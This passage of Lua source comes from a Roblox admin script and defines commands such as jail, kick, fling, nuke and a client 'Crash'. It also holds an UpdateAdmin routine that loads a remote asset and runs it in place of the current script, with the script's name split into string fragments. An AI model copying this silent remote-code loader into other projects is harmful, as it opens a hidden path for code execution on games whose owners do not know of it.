	local Wall = Instance.new("Part", Cell) Wall.Name = "Wall" Wall.FormFactor = "Custom" Wall.Size = Vector3.new(15,14.2,1) Wall.BrickColor = BrickColor.new("Bright blue") Wall.TopSurface = "Smooth" Wall.BottomSurface = "Smooth" Wall.Position = Vector3.new(0,1009.3,-7) Wall.Anchored = true Wall.Locked = true Wall.Transparency = 0.5
	local SG = Instance.new("SurfaceGui", Wall) SG.Name = "SG" SG.Adornee = Wall
	local Text = Instance.new("TextLabel", SG) Text.Size = UDim2.new(1,0,1,0) Text.BackgroundTransparency = 1 Text.TextColor3 = Color3.new(1,1,1) Text.Font = "ArialBold" Text.FontSize = "Size36" Text.TextYAlignment = "Bottom" Text.TextWrapped = true Text.Text = "WARNING: Wild noob in natural habitat. Do no tap glass, it may cause the noob to be angry. Do not open cage and feed noob"
	Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(0,1009.3,7) Wall.SG.Face = "Back"
	Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(-7, 1009.3, 0) Wall.Size = Vector3.new(13,14.2,1) Wall.Rotation = Vector3.new(0,90,0) Wall.SG.Face = "Front"
	Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(7, 1009.3, 0) Wall.Size = Vector3.new(13,14.2,1) Wall.Rotation = Vector3.new(0,90,0) Wall.SG.Face = "Back"
	local Roof = Floor:Clone() Roof.Parent = Cell Roof.Name = "Roof" Roof.Position = Vector3.new(-0,1016.9, 0)
	Cell:MoveTo(Vector3.new(0,3,0))
	
	if Player.Character and Player.Character:FindFirstChild("Torso") then
		Cell:MoveTo(Player.Character.Torso.Position - Vector3.new(0,3,0))
		Player.Character:MoveTo(Floor.Position + Vector3.new(0,2,0))
	end
	table.insert(Dispose, Cell)
	Jails[Player.Name] = Cell
end

function CORE:UnJail(Player)
	if not Player then return nil end
	if Jails[Player.Name] then
		Jails[Player.Name]:Destroy()
		Jails[Player.Name] = nil
	end
end

function CORE:ChangeName(Player, NewName)
	if not Player or not NewName then return nil end
	if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Head") then
		local NewName = STRING:FormatReplace(Player, NewName)
		
		for _,Obj in pairs(Player.Character:GetChildren()) do
			if Obj.Name == "Label" then Obj:Destroy() end
		end
		
		local Head = Player.Character.Head
		local HeadClone = Head:Clone()
		
		-- make actual head invisible
		Head.Transparency = 1
		ypcall(function() Head.face.Transparency = 1 end)

		-- make fake head visible
		HeadClone.Transparency = 0
		ypcall(function() HeadClone.face.Transparency = 0 end)

		local Label = Instance.new("Model", Player.Character)
		Label.Name = "Label"

		local Model = Instance.new("Model", Label)
		Model.Name = NewName

		local HumanoidClone = Instance.new("Humanoid", Model)
		coroutine.wrap(function() while wait() and Player.Character and Player.Character:FindFirstChild("Humanoid") do HumanoidClone.Health = Player.Character.Humanoid.Health HumanoidClone.MaxHealth = Player.Character.Humanoid.MaxHealth end end)()

		HeadClone.Position = Vector3.new(0,100,0)
		HeadClone.CanCollide = false
		ypcall(function() HeadClone.BrickColor = Player.Character["Body Colors"].Head end)
		
		
		Delay(0.01, function() -- new roblox engine needs time to proccess that a label needs to be given after a model's been created
			HeadClone.Parent = Model
			local Weld = Instance.new("Weld", HeadClone)
			Weld.Part0 = HeadClone
			Weld.Part1 = Head
		end)
	end
end

function CORE:UpdateAdmin()
	if Server.Storage:FindFirstChild("PreventMMLUpdate") then
		return nil
	end
	local UpdateModel = AdminID
	if UpdateModel == 0 then return end
	local NewAdminModel = nil
	ypcall(function() NewAdminModel = Server.IS:LoadAsset(UpdateModel) end)
	if NewAdminModel then
		local NewAdmin = NewAdminModel:FindFirstChild("Ma".."kerModelLua's Admin", true)
		if NewAdmin then
			local NewVersion = NewAdmin:FindFirstChild("Version")
			if NewVersion.Value ~= CORE.Version.Value then
				if ExploitModule then
					ExploitModule.Disabled = true
					ExploitModule:Destroy()
				end
				NewAdmin.Disabled = true
				NewAdmin.Parent = Workspace
				if not Settings then
					local NewSettings = NewAdminModel:FindFirstChild("M".."a".."kerMod".."elL".."a's Admin Settings", true)
					if NewSettings then NewSettings.Parent = Workspace end
				end
				wait() NewAdmin.Disabled = false
				CORE:RemoveAdmin()
			else
				NewAdminModel:Destroy()
			end
		end
	end
end

function CORE:UnpackPlayers(Players)
	local PlayerNames = ""
	for Num,Player in pairs(Players) do
		if Player ~= nil then
			if Num ~= #Players then
				PlayerNames = PlayerNames..Player.Name..", "
			else
				PlayerNames = PlayerNames..Player.Name
			end
		end
	end
	return PlayerNames
end

function CORE:GetValue(Value)
	if Value:IsA("StringValue") then
		if Value.Name == "Owner" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Owner"], Value.Value) end end
		if Value.Name == "Admin" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Admin"], Value.Value) end end
		if Value.Name == "Member" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Member"], Value.Value) end end
		if Value.Name == "Banned" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Banned"], Value.Value) end end
		if Value.Name == "Crashed" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Crashed"], Value.Value) end end
		if Value.Name == "Muted" then if not ScanAdminList(Value.Value) then table.insert(Settings.Ranks["Muted"], Value.Value) end end
		if Value.Name == "RemoveAdmin" then if ScanAdminList(Value.Value) then 
			for Num,Admin in pairs(Settings.Ranks["Admin"]) do
				if Admin == Value.Value then
					table.remove(Settings.Ranks["Admin"],Num)
				end
			end
		end end
	end
end

function CORE:GetPlayer(ID)
	local Return = {"Unknown", ID}
	if tonumber(ID) then
		for _,Data in pairs(CharacterCache) do
			if ID == Data[2] then
				return Data
			end
		end
		ypcall(function()
			local Name = Server.Players:GetNameFromUserIdAsync(ID)
			if Name then
				local Data = {Name, ID}
				table.insert(CharacterCache, Data)
				Return = Data
			end
		end)
	else
		local Name = tostring(ID)
		for _,Data in pairs(CharacterCache) do
			if string.lower(Name) == string.lower(Data[1]) then
				return Data
			end
		end
		ypcall(function()
			local PlayerID = Server.Players:GetUserIdFromNameAsync(Name)
			if PlayerID then
				Name = Server.Players:GetNameFromUserIdAsync(PlayerID) or Name
				local Data = {Name, PlayerID}
				table.insert(CharacterCache, Data)
				Return = Data
			end
		end)
	end
	
	return Return
end

function CORE:ChangeCharacter(Player, ID, Perm, Speaker, NameChar, ManualPos) coroutine.wrap(function()
	if ID and #tostring(ID) >= 1 then
		local PlayerName = nil
		
		local Players = STRING:Scan(ID, Speaker)
		if #Players >= 1 then -- if player is found in server
			ID = Players[1].UserId
		elseif tonumber(ID) then
			local Data = CORE:GetPlayer(ID)
			PlayerName = Data[1]
		else
			local Data = CORE:GetPlayer(tostring(ID))
			PlayerName = Data[1]
			ID = Data[2]
		end
		
		if tonumber(ID) == 20018 then -- exploding easter bunny
			local OldID = ID
			ID = 1
			if Speaker then
				if RANK:GetRank(Speaker) == "Member" then
					coroutine.wrap(function()
						wait(1)
						GUI:SendMessage(Speaker, "You cannot character as this", "RED No exploding easter bunnies allowed, sorry", "Error", 10)
					end)()
				else ID = OldID
				end
			end
		elseif tonumber(ID) == 1311 then -- ffjosh
			local OldID = ID
			ID = 1
			if Speaker then
				if RANK:GetRank(Speaker) == "Member" then
					coroutine.wrap(function()
						wait(1)
						GUI:SendMessage(Speaker, "You cannot character as this", "RED No exploiting moderators allowed, sorry", "Error", 10)
					end)()
				else ID = OldID
				end
			end
		end
		
		if tonumber(ID) then
			local Position = nil
			if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
				if ManualPos then
					Position = ManualPos
				else
					Position = Player.Character.Torso.Position
				end
			end
			Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..ID
			wait() Player:LoadCharacter() wait()
			if Position then Player.Character:MoveTo(Position) end
			if not Perm then
				Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Player.UserId
			end
			if NameChar and PlayerName then
				wait(2)
				CORE:ChangeName(Player, PlayerName)
			end
		end
	end
end)() end

function CORE:GenerateShield(Player)
	if not Player then return nil end
	if not Player.Character then return nil end
	local Torso = Player.Character:FindFirstChild("Torso")
	if not Torso then return nil end
	
	local Shield = Player.Character:FindFirstChild("Shield")
	if Shield then Shield:Destroy() end
	
	Shield = Instance.new("Part", Player.Character)
	Shield.Name = "Shield"
	Shield.Locked = true
	Shield.CanCollide = false
	Shield.Size = Vector3.new(10,10,10)
	Shield.Shape = "Ball"
	Shield.Color = GUI:GetColor()
	Shield.Transparency = 0.5
	Shield.TopSurface = "Smooth"
	Shield.BottomSurface = "Smooth"
	Shield.Anchored = true
	Shield.Position = Torso.Position
	
	local Hum = SOUND:MakeSound(Shield, 147493985, 1, 1, true)
	local Zap = SOUND:MakeSound(Shield, 192783601, 1, 1, false)
	
	Hum:Play()
	
	Shield.Touched:connect(function(Part)
		if Part.Parent ~= Server.Workspace then
			local Humanoid = Part.Parent:FindFirstChild("Humanoid") or Part.Parent.Parent:FindFirstChild("Humanoid") or Part.Parent.Parent.Parent:FindFirstChild("Humanoid")
			if Humanoid then
				local Char = Humanoid.Parent
				if Char:IsA("Model") and Humanoid.Health > 0 then
					if Char ~= Player.Character then
						Char:BreakJoints()
						Zap:Play()
					end
				end
			end
		end
	end)
	
	coroutine.wrap(function() repeat wait()
		Shield.CFrame = Torso.CFrame
	until Torso.Parent == nil or Shield.Parent == nil end)()
end

function CORE:FlingPlayer(Player)
	if Player and Player.Character then
		if Player.Character:FindFirstChild("Torso") then
			local Fling = Instance.new("BodyForce", Player.Character.Torso)
			Fling.Name = "Fling"
			Fling.force = Vector3.new(10000,10000,10000)
		end
	end
end

function CORE:Kick(Player, CustomMessage)
	if not CustomMessage then CustomMessage = "You've been kicked by M".."ake".."rMode".."".."lLua's Admin. You cannot interact with the server in anyway." end
	coroutine.wrap(function() 
		CORE:ExecuteResource("PlayerKickMessage", Player.Character, {["Message"] = CustomMessage})
		wait(1)
		Player:Kick(CustomMessage)
	end)()
end

function CORE:Crash(Player)
	local Parent = Player
	if Player:FindFirstChild("Backpack") then Parent = Player.Backpack
	elseif Player.Character then Parent = Player.Character end
	
	CORE:ExecuteResource("Crash", Parent)
end

function CORE:RestoreCamera(Player)
	if Player.Backpack then
		CORE:ExecuteResource("RestoreCamera", Player.Backpack)
	end
end

function CORE:ScanItems(BaseObj, ObjTypes, ActiveFunc)
	local function ScanInstance(Object)
		if #Object:GetChildren() > 0 then
			for _,Obj in pairs(Object:GetChildren()) do
				local IsType = false
				if ObjTypes and #ObjTypes > 0 then
					for _,ObjType in pairs(ObjTypes) do
						if Obj:IsA(ObjType) then
							IsType = true
							break
						end
					end
				else
					IsType = true
				end
				if IsType == true then
					ActiveFunc(Obj)
				end
				ScanInstance(Obj)
			end
		end
	end
	ScanInstance(BaseObj)
end

function CORE:AnchorPlayer(Player)
	if not Player or not Player.Character or not Player.Character:FindFirstChild("Humanoid") then return end
	
	Player.Character.Humanoid.WalkSpeed = 0
	for _,Object in pairs(Player.Character:GetChildren()) do
		if Object:IsA("BasePart") then
			Object.Anchored = true
		end
	end
end

function CORE:UnanchorPlayer(Player)
	if not Player or not Player.Character or not Player.Character:FindFirstChild("Humanoid") then return end
	
	Player.Character.Humanoid.WalkSpeed = 16
	for _,Object in pairs(Player.Character:GetChildren()) do
		if Object:IsA("BasePart") then
			Object.Anchored = false
		end
	end
end

function CORE:InvisiblePlayer(Player)
	if not Player or not Player.Character then return end
	
	CORE:ScanItems(Player.Character, {"BasePart", "Texture", "Decal"}, function(Obj) Obj.Transparency = 1 end)
end

function CORE:VisiblePlayer(Player)
	if not Player or not Player.Character then return end
	
	CORE:ScanItems(Player.Character, {"BasePart", "Texture", "Decal"}, function(Obj) if Obj.Name ~= "HumanoidRootPart" then Obj.Transparency = 0 end end)
end

function CORE:Nuke(Player) coroutine.wrap(function()
	local Pos = CFrame.new(0,1,0)
	if Player and Player.Character and Player.Character:FindFirstChild("Torso") then Pos = Player.Character.Torso.CFrame * CFrame.new(0,1,0) end
	local Blast = Instance.new("Part", Server.Workspace) Blast.Name = "BlastEx" Blast.Anchored = true Blast.CanCollide = false Blast.Size = Vector3.new(1,1,1) Blast.CFrame = Pos
	local BlastMesh = Instance.new("SpecialMesh", Blast) BlastMesh.MeshId = "rbxassetid://1290033" BlastMesh.TextureId = "rbxassetid://33145325" BlastMesh.Scale = Vector3.new(0,0,0)
	local Wave = Instance.new("Part", Server.Workspace) Wave.BrickColor = BrickColor.new("Deep orange") Wave.Name = "WaveEx" Wave.Anchored = true Wave.CanCollide = false Wave.Size = Vector3.new(1,1,1) Wave.CFrame = Pos * CFrame.Angles(math.pi/2,0,0)
	local WaveMesh = Instance.new("SpecialMesh", Wave) WaveMesh.MeshId = "rbxassetid://3270017"
	local Light = Instance.new("PointLight", Blast) Light.Brightness = 1000 Light.Range = 10000 Light.Color = Color3.new(1,0.2,0.2)
	
	local Effect = Instance.new("ColorCorrectionEffect", Server.Lighting) Effect.Brightness = 0.2 Effect.Contrast = 0.4 Effect.Saturation = 1 Effect.TintColor = Color3.new(1,0.2,0.2)
	
	Server.Lighting.Brightness = 5
	Server.Lighting.Ambient = Color3.new(1,0.5,0.5)
	Server.OutdoorAmbient = Color3.new(1,1,1)
	
	local Exp = Instance.new("Explosion", Server.Workspace)
	Exp.Position = Pos.p
	Exp.BlastPressure = 10000000
	Exp.BlastRadius = 1000000
	Exp.Hit:connect(function(Part)
		if Part.Name ~= "Base" and Part.Name ~= "BasePlate" and Part ~= Blast and Part ~= Wave and Part.Name ~= "BlastEx" and Part.Name ~= "WaveEx" then
			ypcall(function()
				Part.Anchored = false
				Part.BrickColor = BrickColor.new("Black")
				Part.Material = "Slate"
				Part:BreakJoints()	
			end)
		end
	end)

	local BoomSound = SOUND:MakeSound(Server.Workspace, 212389494, 1, 1.2, false)
	BoomSound:Play()
	for i = 0,100,0.5 do
		Blast.Anchored = true
		Wave.Anchored = true
		BlastMesh.Scale = Vector3.new(i,i,i)
		WaveMesh.Scale = Vector3.new(i^1.3,i^1.3,5)
		Blast.CFrame = Pos
		wait()
	end
	BoomSound:Stop()
	Blast:Destroy()
	Wave:Destroy()
	wait()
	BoomSound:Destroy()
	Effect:Destroy()
	for i = 10,5,-1 do
		Server.Lighting.Brightness = (i-5) + 1
		Server.Lighting.Ambient = Color3.new(i/10,0.5,0.5)
		Server.OutdoorAmbient = Color3.new(i/10,i/10,i/10)
		wait(0.05)
	end
end)() end

function CORE:Insert(AssetID, Parent, GetFirstChild, FirstChildTypes, AbuseMode)
	local AssetID = tonumber(AssetID)
	local Item = nil
	if AssetID and AssetID ~= 1055299 then
		local CanInsert = true
		if AbuseMode then
			for _,ID in pairs(RemoteAbuseGear) do
				if AssetID == tonumber(ID) then CanInsert = false break end
			end
			for _,ID in pairs(Settings.AbusableGear) do
				if AssetID == tonumber(ID) then CanInsert = false break end
			end
		end
		if CanInsert then
			Item = Server.IS:LoadAsset(AssetID)
			if GetFirstChild then
				Item = Item:GetChildren()[1]
				if FirstChildTypes and Item then
					local ValidType = false
					for _,Type in pairs(FirstChildTypes) do
						if Item:IsA(Type) then
							ValidType = true
							break
						end
					end
					if ValidType == false then
						Item = nil
					end
				end
			end
			if Item and Parent then
				Item.Parent = Parent
			end
		end
	end
	return Item
end

function CORE:GivePackage(Player, PID) coroutine.wrap(function()
	if not Player or not Player.Character then return nil end
	PID = tonumber(PID)
	for _,Obj in pairs(Player.Character:GetChildren()) do
		if Obj:IsA("CharacterMesh") then Obj:Destroy() end
	end
	if PID then
		-- back when we needed HttpService to get packages.
		--[[
		if PackageCache[PID] then
			for _,ID in pairs(PackageCache[PID]) do
				CORE:Insert(ID, Player.Character, true, {"CharacterMesh"})
			end
		else
			local IDsJSON = REMOTE:GetURL(CORE.Domain.."/APIs/GetPackage.php?PackageID="..PID)
			if IDsJSON then
				local IDs = REMOTE:Decode(IDsJSON)
				if IDs then
					if not IDs["Error"] then
						table.insert(PackageCache, IDs)
						for _,ID in pairs(IDs) do
							CORE:Insert(ID, Player.Character, true, {"CharacterMesh"})
						end
					end
				end
			end
		end
		]]
		-- also, no need for a package cache since the GetAssetIdsForPackage method handles that internally
		local IDs = {}
		ypcall(function() IDs = Server.AS:GetAssetIdsForPackage(PID) end) -- it still errors so it needs to be contained.
		if #IDs > 0 then
			for _,ID in pairs(IDs) do
				local PackagePart = CORE:Insert(ID)
				for _,Obj in pairs(PackagePart:GetChildren()) do
					if Obj:IsA("Accoutrement") or Obj:IsA("CharacterMesh") then
						Obj.Parent = Player.Character
					elseif Obj:IsA("Folder") then
						if Obj.Name == "R6" then -- r15 coming to mml's admin confirmed?
							Obj:GetChildren()[1].Parent = Player.Character
						end
					end
				end
			end
		end
	end
end)() end

function CORE:ChangeBet(Bet)
	if tostring(Bet) and Bet ~= Settings.Bet then
		for Index,Data in pairs(Commands) do
			Commands[Index][1] = string.gsub(Data[1], Settings.Bet, Bet)
		end
		Settings.Bet = Bet
	end
end

function CORE:ResetLighting()
	ModLighting = false wait(0.2) ModLighting = true
end

function CORE:Fly(Player, Force)
	if Player and Player.Character then
		local StopFly = Instance.new("RemoteFunction", Player.Character)
		StopFly.Name = "StopMMLFly"
		CORE:ExecuteResource("Fly", Player.Character, {["Force"] = Force, ["StopFunc"] = StopFly})
	end
end

function CORE:GiveTools(Player, Type)
	if not Player or not Player:FindFirstChild("Backpack") then return nil end
	Type = string.lower(Type)
	local _,RankNum = RANK:GetRank(Player)
	local BuildTools = {73089166, 73089190, 73089204, 73089214, 73089239, 73089259, 58921588}
	local BaseBuildTools = {["Move"] = "GameTool", ["Clone"] = "Clone", ["Delete"] = "Hammer"}
	
	if Type == "basicbtools" or Type == "basicbuildtools" or Type == "basicbuildingtools" then
		for Name,Type in pairs(BaseBuildTools) do
			local Tool = Instance.new("HopperBin", Player.Backpack)
			Tool.Name = Name
			Tool.BinType = Type
		end
	elseif Type == "psbtools" then
		for _,Tool in pairs(BuildTools) do
			CORE:Insert(Tool, Player.Backpack, true)
		end
	elseif Type == "f3xtools" or Type == "fextools" or Type == "f3x" then
		if F3X then
			local F3X = F3X:Clone()
			F3X.Parent = Player.Backpack
		end
	elseif Type == "btools" then
		if F3X then
			local F3X = F3X:Clone()
			F3X.Parent = Player.Backpack
		end
		for Name,Type in pairs(BaseBuildTools) do
			local Tool = Instance.new("HopperBin", Player.Backpack)
			Tool.Name = Name
			Tool.BinType = Type
		end
		for _,Tool in pairs(BuildTools) do
			CORE:Insert(Tool, Player.Backpack, true)
		end
	else
		for _,Region in pairs(ToolRegions) do
			CORE:ScanItems(Region, {"HopperBin", "Tool"}, function(Item)
				if Type == "all" then
					local NewItem = Item:Clone()
					NewItem.Parent = Player.Backpack
				elseif string.sub(string.lower(Item.Name),1,#Type) == string.lower(Type) then
					local NewItem = Item:Clone()
					NewItem.Parent = Player.Backpack
				end
			end)
		end
	end
end

function CORE:Scale(Player, ScalePercent)
	if not Player or not Player.Character or not tonumber(ScalePercent) then return end
	local Ratio = ScalePercent/100
	if Ratio < 0.05 then Ratio = 0.05 end
	if Ratio > 100 then Ratio = 100 end
	if Ratio > 1 then Ratio = math.ceil(Ratio) end
	local Char = Player.Character
	
	local Clean = Char:FindFirstChild("Clean")
	if Clean then Clean:Invoke() wait(0.1) Char = Player.Character end
	Clean = Instance.new("BindableFunction", Char) Clean.Name = "Clean"

	local function Cycle(BaseObj, ScaleRatio, NewAdd, JustWeld)
		local Welds = {}
		local Parts = {}
		
		local function Handle(Obj)
			if Obj:IsA("BasePart") and not JustWeld then
				table.insert(Parts, Obj)
			elseif Obj:IsA("SpecialMesh") and not JustWeld then
				if Obj.Name == "MML Mesh" then
					Obj:Destroy()
				end
				if Obj.MeshType == Enum.MeshType.FileMesh then
					Obj.Offset = Obj.Offset * ScaleRatio
					Obj.Scale = Obj.Scale * ScaleRatio
				elseif Ratio < 1 then
					Obj.Offset = Obj.Offset * ScaleRatio
					Obj.Scale = Obj.Scale * ScaleRatio
				end
			elseif Obj:IsA("CharacterMesh") and not JustWeld then
				if Ratio < 1 then
					local BodyPart = ""
					local TextureID = Obj.BaseTextureId
					if TextureID == 0 then TextureID = Obj.OverlayTextureId end
					if TextureID == 0 then TextureID = nil end
					if Obj.BodyPart == Enum.BodyPart.LeftArm then BodyPart = "Left Arm" end
					if Obj.BodyPart == Enum.BodyPart.RightArm then BodyPart = "Right Arm" end
					if Obj.BodyPart == Enum.BodyPart.LeftLeg then BodyPart = "Left Leg" end
					if Obj.BodyPart == Enum.BodyPart.RightLeg then BodyPart = "Right Leg" end
					if Obj.BodyPart == Enum.BodyPart.Torso then BodyPart = "Torso" end
					if Obj.BodyPart == Enum.BodyPart.Head then BodyPart = "Head" end
					local NewMesh = Instance.new("SpecialMesh", Obj.Parent:FindFirstChild(BodyPart))
					NewMesh.Name = "MML Mesh"
					NewMesh.Scale = Vector3.new(ScaleRatio,ScaleRatio,ScaleRatio)
					if TextureID then NewMesh.TextureId = "rbxassetid://"..TextureID end
					NewMesh.MeshId = "rbxassetid://"..Obj.MeshId
					Obj:Destroy()
				end
			elseif Obj:IsA("JointInstance") then
				local NewWeld = Obj:Clone()
				table.insert(Welds, {NewWeld, Obj.Parent})
			elseif NewAdd == true and not JustWeld then
				if Obj:IsA("Tool") then
					--Cycle(Char["Right Arm"], ScaleRatio, false, true)
				elseif Obj:IsA("Accoutrement") then
					--Cycle(Char.Head, ScaleRatio, false, true)
				end
			end
			if #Obj:GetChildren() > 0 then
				for _,NewObj in pairs(Obj:GetChildren()) do
					Handle(NewObj, ScaleRatio)
				end
			end
		end
		Handle(BaseObj)
		for _,Part in pairs(Parts) do
			if Ratio >= 1 then
				Part.Size = Part.Size * ScaleRatio
			else
				local Allowed = true
				for _,Obj in pairs(Part:GetChildren()) do
					if Obj:IsA("DataModelMesh") or Obj.Name == "MML Mesh" then
						Allowed = false
					end
				end
				if Allowed == true then
					local NewMesh = Instance.new("BlockMesh", Part)
					NewMesh.Name = "MML Mesh"
					NewMesh.Scale = Vector3.new(Ratio,Ratio,Ratio)
				end
			end
		end
		for _,WeldData in pairs(Welds) do
			if WeldData[1] then
				local Obj = WeldData[1]
				local NewWeld = Obj:Clone()
				
				NewWeld.Parent = WeldData[2]
				NewWeld.C0 = CFrame.new(Obj.C0.p * ScaleRatio) * CFrame.Angles(Obj.C0:toEulerAnglesXYZ())
				NewWeld.C1 = CFrame.new(Obj.C1.p * ScaleRatio) * CFrame.Angles(Obj.C1:toEulerAnglesXYZ())
			end
		end
		for _,Part in pairs(Parts) do
			Part:MakeJoints()
		end
		Welds = {}
		Parts = {}
	end
	Cycle(Char, Ratio)
	Char:MakeJoints()
	
	local Added = Char.ChildAdded:connect(function(Obj)
		Cycle(Obj, Ratio, NewAdd)
	end)
	local Removed = Char.ChildRemoved:connect(function(Obj)
		Cycle(Obj, Ratio^-1, NewAdd)
	end)
	
	Clean.OnInvoke = function()
		Added:disconnect()
		Removed:disconnect()
		local Location = Vector3.new(0,5,0)
		if Char:FindFirstChild("Torso") then
			Location = Char.Torso.Position + Vector3.new(0,2,0)
		end
		Player:LoadCharacter()
		wait(0.5)
		Player.Character:MoveTo(Location)
		wait(0.5)
		return nil
	end
	
	if Char:FindFirstChild("Torso") then
		Char:MoveTo(Char.Torso.Position + Vector3.new(0,Ratio*3))
	end
	if Char:FindFirstChild("Humanoid") then
		Char.Humanoid.WalkSpeed = Char.Humanoid.WalkSpeed * (Ratio)
	end
	if Ratio < 1 and Char:FindFirstChild("HumanoidRootPart") and Char.HumanoidRootPart:FindFirstChild("RootJoint") then
		Char.HumanoidRootPart.RootJoint.C0 = CFrame.new(0,-(3-(Ratio*3)),0) * CFrame.Angles(-math.rad(90),0,math.pi)
	end
end

function CORE:AddExploit(PlayerClient, Data)
	local PlayerClientName = PlayerClient.Name
	local NewData = CORE:GetTime(true, true).." @ "..Data
	for _,Player in pairs(Server.Players:GetChildren()) do
		GUI:SendHint(Player, "Exploiter Found: "..PlayerClientName.." | If you are an admin view exploit logs by saying ;exploitlogs", 5)
	end
	local ExploitLog = Server.GDS:GetAsync("ExploitLog")
	if type(ExploitLog) ~= "table" then
		Server.GDS:SetAsync("ExploitLog", {NewData})
	else
		table.insert(ExploitLog, NewData)
		Server.GDS:SetAsync("ExploitLog", ExploitLog)
	end
	REMOTE:SendHttpLog("EXPLOITER FOUND: "..Data, "WARNING")
	
	return true
end

function CORE:CreateFigure(Name, Position, DisableAnimation, Speaker)
	if not tostring(Name) then Name = "Dummy" end
	if not Position then Position = Vector3.new(0,5,0) end
	if Speaker and Speaker.Character and Speaker.Character:FindFirstChild("Torso") then
		Position = Speaker.Character.Torso.Position + Vector3.new(0,5,10)
	end
	
	local Figure = CORE:Insert(68452456, Server.Workspace, true)
	Figure:MakeJoints()
	Figure.Head.BrickColor = BrickColor.new("Bright yellow")
	Figure["Left Arm"].BrickColor = BrickColor.new("Bright yellow")
	Figure["Right Arm"].BrickColor = BrickColor.new("Bright yellow")
	Figure["Left Leg"].BrickColor = BrickColor.new("Dark green")
	Figure["Right Leg"].BrickColor = BrickColor.new("Dark green")
	Figure.Torso.BrickColor = BrickColor.new("Bright blue")
	
	Figure.Name = STRING:FormatReplace(Speaker, Name)
	Figure:MoveTo(Position)
	
	table.insert(Objects, Figure)
	
	if DisableAnimation == true then
		Figure.Animate.Disabled = true
	end
	
	return Figure
end

function CORE:ClonePlayer(Player, Name, Position)
	if not Player or not Player.Character then return nil end
	
	Player.Character.Archivable = true
	local Char = Player.Character:Clone()
	Player.Character.Archivable = false
	if Name then Char.Name = STRING:FormatReplace(Player, Name) end
	if Position then Char:MoveTo(Position) end
	Char.Parent = Server.Workspace
	Char:MakeJoints()
	Char:MoveTo(Player.Character.Torso.Position + Vector3.new(0,3,1))
	
	table.insert(Objects, Char)
	
	return Obj
end

function CORE:AddWaypoint(Name, Position, Speaker)
	Waypoints[Name] = Position
	if Speaker then
		GUI:SendHint(Speaker, "Waypoint "..Name.." is located at ("..tostring(Position)..")", 2)
	end
end

function CORE:FindType(BaseObj, Type)
	for _,Obj in pairs(BaseObj:GetChildren()) do
		if Obj:IsA(Type) then
			return Obj
		end
	end
end

function CORE:GetCommands()
	local CommandsCopy = Commands
	return CommandsCopy
end

function CORE:Crown(Player, Mesh, Color)
	if Mesh then Mesh = string.lower(Mesh) end
	if not Mesh or not Meshes[Mesh] then Mesh = "crown" end
	if not Player or not Player.Character or not Player.Character:FindFirstChild("Head") then return end
	local Part = Instance.new("Part", CrownStorage)
	Part.Size = Vector3.new(2, 1, 1)
	Part.CanCollide = false
	Part.CFrame = Player.Character.Head.CFrame
	Part.Locked = true
	Part.Material = "Neon"
	if Color then
		Part.Color = GUI:GetColor(Color)
	else
		Part.BrickColor = GUI:GetNameColor(Player.Name)
	end
	local SMesh = Instance.new("SpecialMesh", Part)
	SMesh.Scale = Vector3.new(Meshes[Mesh][1],Meshes[Mesh][1],Meshes[Mesh][1])
	SMesh.MeshId = "rbxassetid://"..Meshes[Mesh][2]
	local BP = Instance.new("BodyPosition", Part)
	BP.maxForce = Vector3.new(math.huge,math.huge,math.huge)
	BP.position = Player.Character.Head.Position
	BP.P = 20000
	local BG = Instance.new("BodyGyro", Part)
	BG.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
	
	Crowns[Player.UserId] = Part
	table.insert(Objects, Part)
	
	coroutine.wrap(function()
		for i = 1,0.3,-0.02 do
			if Part.Parent == CrownStorage and Player.Character and Player.Character:FindFirstChild("Head") then
				Part.Transparency = i
			end
			wait()
		end
		while Crowns[Player.UserId] and Part.Parent == CrownStorage and wait() do
			for i = 0,360,3 do
				if Part.Parent == CrownStorage and Player.Character and Player.Character:FindFirstChild("Head") then
					Part.Transparency = (math.sin(math.rad(i))/10) + 0.3
					wait()
				end
			end
		end
	end)()
	coroutine.wrap(function() while Crowns[Player.UserId] and Part.Parent == CrownStorage and wait() do
		Part:BreakJoints()
		for i = 0,360 do
			if Part.Parent == CrownStorage and Player.Character and Player.Character:FindFirstChild("Head") then
				Part.Anchored = false
				BP.position = Player.Character.Head.CFrame:toWorldSpace(CFrame.new(0,(math.sin(math.rad(i))/3) + 1.5, 0)).p
				BG.cframe = Player.Character.Head.CFrame
			end
			wait()
		end
	end end)()
	
	return Part
end

function CORE:SetAbuseCommands()
	for Cmds,Data in pairs(Commands) do
		local IsAbusable = false
		for _,AbuseCmd in pairs(Settings.AbuseList) do
			for _,Command in pairs(Cmds) do -- loop through all command names
				if string.sub(Command,1,#AbuseCmd) == string.lower(AbuseCmd) then
					IsAbusable = true
					break
				end
			end
			if IsAbusable == true then break end
		end
		Commands[Cmds].Abusable = IsAbusable
	end
end

function CORE:FindBodyPart(Player, BodyPart)
	local ReturnPart = nil
	if Player and Player.Character then
		local Humanoid = Player.Character:FindFirstChild("Humanoid")
		if Humanoid then
			if BodyPart == "Humanoid" then ReturnPart = Humanoid
			elseif BodyPart == "Left Arm" then ReturnPart = Humanoid.LeftArm
			elseif BodyPart == "Right Arm" then ReturnPart = Humanoid.RightArm
			elseif BodyPart == "Left Leg" then ReturnPart = Humanoid.LeftLeg
			elseif BodyPart == "Right Leg" then ReturnPart = Humanoid.RightLeg
			elseif BodyPart == "Torso" then ReturnPart = Humanoid.Torso
			elseif BodyPart == "Head" then ReturnPart = Humanoid.Head
			end
		end
		if not ReturnPart then
			ReturnPart = Player.Character:FindFirstChild(BodyPart)
		end
	end
	
	return ReturnPart
end

-- Rank functions --

function RANK:ConvertRank(Input)
	local Output = nil
	if Input == "Muted" then Output = -3 end
	if Input == "Crashed" then Output = -2 end
	if Input == "Banned" then Output = -1 end
